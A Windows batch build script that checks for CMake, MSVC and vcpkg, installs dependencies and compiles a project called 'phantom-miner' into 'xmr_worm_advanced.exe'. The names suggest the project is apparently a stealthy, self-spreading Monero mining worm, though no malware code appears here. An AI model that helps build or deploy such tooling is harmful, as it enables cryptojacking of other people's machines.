@echo off
REM phantom-miner — Windows Build Script (MSVC + vcpkg)

echo [*] Building phantom-miner for Windows...

REM Check CMake
where cmake >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [!] CMake not found. Install from https://cmake.org/download/
    pause
    exit /b 1
)

REM Check for Visual Studio compiler
where cl >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [!] MSVC compiler not found.
    echo [!] Install Visual Studio Build Tools: https://visualstudio.microsoft.com/visual-cpp-build-tools/
    echo [!] Or run this from a Developer Command Prompt.
    pause
    exit /b 1
)

REM Check vcpkg
if not defined VCPKG_ROOT (
    if exist "C:\vcpkg\vcpkg.exe" (
        set "VCPKG_ROOT=C:\vcpkg"
    ) else (
        echo [!] vcpkg not found. Clone it first:
        echo     git clone https://github.com/microsoft/vcpkg.git C:\vcpkg
        echo     C:\vcpkg\bootstrap-vcpkg.bat
        pause
        exit /b 1
    )
)

REM Install dependencies via vcpkg
echo [*] Installing dependencies via vcpkg...
%VCPKG_ROOT%\vcpkg install curl:x64-windows openssl:x64-windows nlohmann-json:x64-windows

REM Create build directory
if not exist build_vcpkg mkdir build_vcpkg
cd build_vcpkg

REM Configure with CMake + vcpkg toolchain
echo [*] Configuring project with CMake...
cmake .. -G "Visual Studio 17 2022" -A x64 ^
    -DCMAKE_TOOLCHAIN_FILE=%VCPKG_ROOT%\scripts\buildsystems\vcpkg.cmake ^
    -DCMAKE_BUILD_TYPE=Release
if %ERRORLEVEL% NEQ 0 (
    echo [!] CMake configuration failed.
    cd ..
    pause
    exit /b 1
)

REM Build
echo [*] Building project...
cmake --build . --config Release --parallel
if %ERRORLEVEL% NEQ 0 (
    echo [!] Build failed.
    cd ..
    pause
    exit /b 1
)

REM Done
cd ..
echo.
echo [*] Build complete!
echo [*] Binary: build_vcpkg\Release\xmr_worm_advanced.exe
pause